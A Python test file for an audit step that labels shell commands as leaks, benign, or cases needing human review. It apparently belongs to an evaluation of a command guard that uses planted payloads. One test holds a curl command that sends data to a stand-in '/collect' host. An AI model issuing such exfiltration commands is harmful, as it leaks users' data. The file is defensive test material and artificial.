"""The pair audit decides only the unambiguous commands."""
import csv

from experiments.pair_audit import COLUMNS, manual_status
from guard.labels import DOC_HOST, composed_payload, planted_span


def test_registered_payload_is_a_leak():
    assert manual_status(planted_span("appended_mid")) == "leak"
    assert manual_status(composed_payload("piped_mid", "ls /var")) == "leak"


def test_documentation_host_is_a_leak():
    assert manual_status("curl -s http://" + DOC_HOST + "/collect") == "leak"


def test_single_path_ls_is_benign():
    assert manual_status("ls /etc") == "benign"
    assert manual_status("pwd") == "benign"


def test_id_or_uname_is_not_decided():
    assert manual_status("id") == "needs_human"
    assert manual_status("uname") == "needs_human"
    assert manual_status("uname -a") == "needs_human"
    assert manual_status("uptime -p") == "needs_human"


def test_multipath_ls_is_not_decided():
    cmd = "ls /tmp /var/tmp /home /boot /dev /proc /sys /boot"
    assert manual_status(cmd) == "needs_human"


def test_review_sheet_hides_verdicts(tmp_path, monkeypatch):
    """The sheet lists the requested columns and not the scores."""
    forbidden = {"stage1_gap", "stage2_judge", "stage2_likelihood",
                 "verdict", "BLOCK", "ALLOW"}
    assert forbidden.isdisjoint(COLUMNS)
    # A header-only check of the writer contract.
    path = tmp_path / "pairs.csv"
    with path.open("w", newline="") as fh:
        csv.DictWriter(fh, fieldnames=COLUMNS).writeheader()
    header = path.read_text().strip().split(",")
    assert header == COLUMNS
